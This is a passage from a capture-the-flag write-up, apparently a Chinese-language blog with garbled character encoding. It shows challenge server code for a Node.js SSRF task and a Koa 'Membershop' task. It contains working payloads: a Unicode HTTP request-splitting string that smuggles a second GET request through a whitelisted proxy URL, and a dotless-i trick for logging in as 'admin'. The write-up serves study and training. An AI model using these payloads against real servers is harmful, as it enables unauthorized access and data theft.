&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;server.js&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">contents&lt;/span> &lt;span style="color:#75715e">// è¿”å›žæºç 
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/:token&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">token&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// é•¿åº¦å¤§äºŽ10å›žæ˜¾ip
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public/temp/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å°†flagå†™å…¥public/temp/md5(ip+token)è·¯å¾„ä¸‹ è·¯å¾„å¯æŽ§ ä½†æ˜¯è®¿é—®æœ¬èº«å—é™ éœ€è¦SSRFç»•è¿‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;*&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çªç ´å£åœ¨å®ƒä½¿ç”¨çš„Node.jsçš„ç‰ˆæœ¬æ°å¥½æœ‰ä¸Šè¿°SSRFçš„é—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¥æ‰‹ç‚¹çš„ä»£ç ä»£ç å°±æ˜¯è¿™é‡Œäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210752342.png" alt="image-20211205210752342">&lt;/p>
&lt;p>çŽ°åœ¨å°±è¯´æƒ³åŠžæ³•ç»•è¿‡ç™½åå•çš„å®¡æŸ¥å¹¶æž„é€ payloadï¼›æˆ‘ä»¬éœ€è¦ç¬¬ä¸€ä¸ªè¯·æ±‚æŒ‡å‘&lt;code>/proxy/internal_website/public_notes&lt;/code>ï¼Œç¬¬äºŒä¸ªè¯·æ±‚æŒ‡å‘&lt;code>/flag/amiz&lt;/code>ï¼Œè®©flagå­˜åœ¨&lt;code>public/temp/md5(127.0.0.1amiz)&lt;/code>è·¯å¾„ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>public_notes\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0166}\u{016c}\u{0161}\u{0167}/amiz
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz
&lt;/code>&lt;/pre>&lt;h2 id="å®‰æ´µæ¯-2019membershop">[å®‰æ´µæ¯ 2019]Membershop&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206224942653.png" alt="image-20211206224942653">&lt;/p>
&lt;p>adminä¼šè¢«è¿‡æ»¤ï¼Œé‚£å°±å…ˆç®€å•ç™»å…¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225301864.png" alt="image-20211206225301864">&lt;/p>
&lt;p>æŠ“åŒ…åŽé€šè¿‡sessionå¯ä»¥çœ‹å‡ºæ˜¯koaæ¡†æž¶&lt;/p>
&lt;p>è¿™é‡Œå‡ºé¢˜äººè¯´å¾ˆå®¹æ˜“è”æƒ³åˆ°åŽç«¯ä½¿ç”¨&lt;code>toUpperCase()&lt;/code>çš„è½¬æ¢ï¼Œç”¨æ‹‰ä¸æ–‡è¶Šæƒç™»å½•&lt;code>admÄ±n&lt;/code>ï¼Œä¹‹å‰ä¹Ÿæœ‰ä¸€æ¬¡åšé¢˜ç”¨åˆ°è¿™ä¸ªç‚¹äº†ï¼Œä½†æ˜¯åœ¨è¿™é‡Œæ²¡æœ‰æƒ³èµ·æ¥ï¼Œæˆ‘çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225648044.png" alt="image-20211206225648044">&lt;/p>
&lt;p>è¿™ä¸‹å¯ä»¥çœ‹æºç äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">router&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-router&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-session&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">bodyParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-bodyparser&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">isString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;underscore&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">views&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-views&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">qs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;qs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">home&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">CONFIG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;koa:sess&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">maxAge&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1800000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">overwrite&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">httpOnly&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">signed&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">rolling&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">renew&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:3000/query&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;save&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;å†™å…¥æˆåŠŸ&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;åˆ é™¤æ–‡ä»¶æˆåŠŸ&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/query&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;amp;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span 